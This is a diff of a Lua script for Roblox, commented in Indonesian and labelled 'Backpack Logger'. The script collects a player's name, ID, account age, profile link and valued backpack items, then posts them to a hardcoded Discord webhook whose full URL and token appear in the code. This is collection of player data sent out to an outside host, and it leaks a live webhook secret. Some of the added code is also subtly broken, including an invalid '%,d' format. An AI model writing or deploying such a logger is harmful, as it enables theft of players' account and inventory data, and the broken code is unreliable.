@@ -7,17 +7,40 @@ local playerName = player.Name
 local accountAge = player.AccountAge -- umur akun dalam hari
 local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
 
--- Ambil isi backpack
+-- Kumpulkan isi backpack (format seperti di gambar)
 local backpack = player:WaitForChild("Backpack")
 local backpackItems = {}
 for _, item in ipairs(backpack:GetChildren()) do
-    table.insert(backpackItems, item.Name)
+    -- Format: "Item Name [Weight] [Age] → Value#"
+    local weight = string.format("%.2f KG", item:GetAttribute("Weight") or 0)
+    local age = item:GetAttribute("Age") or 1
+    local value = item:GetAttribute("Value") or 0
+    local formattedValue = string.format("%,d#", value)
+    
+    -- Handle special [Celestial] tag if present
+    local itemName = item.Name
+    if item:GetAttribute("IsCelestial") then
+        itemName = "[Celestial] " .. itemName
+    end
+    
+    table.insert(backpackItems, string.format("%s [%s] [Age %d] → %s", 
+        itemName, weight, age, formattedValue))
 end
-local backpackStr = #backpackItems > 0 and table.concat(backpackItems, ", ") or "Kosong"
 
--- Batasi panjang backpackStr max 1000 karakter untuk aman
-if #backpackStr > 1000 then
-    backpackStr = string.sub(backpackStr, 1, 997) .. "..."
+-- Urutkan berdasarkan nilai terbesar ke terkecil (seperti di gambar)
+table.sort(backpackItems, function(a, b)
+    local valueA = tonumber(string.match(a, "→ ([%d,]+)#"):gsub(",", "")) or 0
+    local valueB = tonumber(string.match(b, "→ ([%d,]+)#"):gsub(",", "")) or 0
+    return valueA > valueB
+end)
+
+-- Gabungkan dengan format baris baru
+local backpackStr = #backpackItems > 0 and table.concat(backpackItems, "\n") or "Kosong"
+
+-- Batasi panjang string agar tidak melebihi batas embed Discord (~4000 karakter)
+local maxLength = 3000
+if #backpackStr > maxLength then
+    backpackStr = string.sub(backpackStr, 1, maxLength - 3) .. "..."
 end
 
 local webhookUrl = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
@@ -54,29 +77,47 @@ local function safeRequest(options)
     end
 end
 
--- Timestamp ISO lengkap
-local timeNow = DateTime.now():ToIsoDate() .. "T" .. os.date("%H:%M:%S") .. "Z"
+-- Waktu ISO 8601 lengkap (tanggal + waktu)
+local isoTimestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- UTC time
 
+-- Buat payload embed webhook Discord
 local webhookPayload = {
     ["username"] = "🎒 Backpack Logger",
-    ["avatar_url"] = "https://i.imgur.com/0y0F0Gj.png",
+    ["avatar_url"] = "https://i.imgur.com/0y0F0Gj.png", -- Icon tas, bisa diganti
     ["embeds"] = {{
         ["title"] = "📦 Informasi Backpack dan Akun",
-        ["color"] = 0x3498db,
+        ["color"] = 0x3498db, -- biru
         ["fields"] = {
-            { ["name"] = "👤 Player", ["value"] = string.format("`%s` (ID: `%d`)", playerName, userId), ["inline"] = true },
-            { ["name"] = "⏳ Umur Akun", ["value"] = string.format("%d hari", accountAge), ["inline"] = true },
-            { ["name"] = "🔗 Profile Roblox", ["value"] = string.format("[Klik Disini](%s)", profileUrl), ["inline"] = false },
-            { ["name"] = "🎒 Isi Backpack", ["value"] = backpackStr, ["inline"] = false }
+            {
+                ["name"] = "👤 Player",
+                ["value"] = string.format("`%s` (ID: `%d`)", playerName, userId),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "⏳ Umur Akun",
+                ["value"] = string.format("%d hari", accountAge),
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🔗 Profile Roblox",
+                ["value"] = string.format("[Klik Disini](%s)", profileUrl),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🎒 Isi Backpack",
+                ["value"] = "```\n" .. backpackStr .. "\n```", -- Format sebagai code block
+                ["inline"] = false
+            }
         },
         ["footer"] = {
             ["text"] = "Backpack Logger - " .. os.date("%Y-%m-%d %H:%M:%S"),
             ["icon_url"] = "https://i.imgur.com/Z4VbQXz.png"
         },
-        ["timestamp"] = timeNow
+        ["timestamp"] = isoTimestamp
     }}
 }
 
+-- Kirim webhook ke Discord
 local response = safeRequest({
     Url = webhookUrl,
     Method = "POST",
@@ -86,7 +127,7 @@ local response = safeRequest({
     Body = HttpService:JSONEncode(webhookPayload)
 })
 
-if response and (response.StatusCode == 204 or response.StatusCode == 200) then
+if response and (response.StatusCode == 204 or response.StatusCode == 200) then -- Discord webhook sukses (204 No Content atau 200 OK)
     print("✅ Webhook Discord berhasil dikirim!")
 else
     warn("❌ Gagal mengirim webhook:", response and response.StatusCode or "No response")
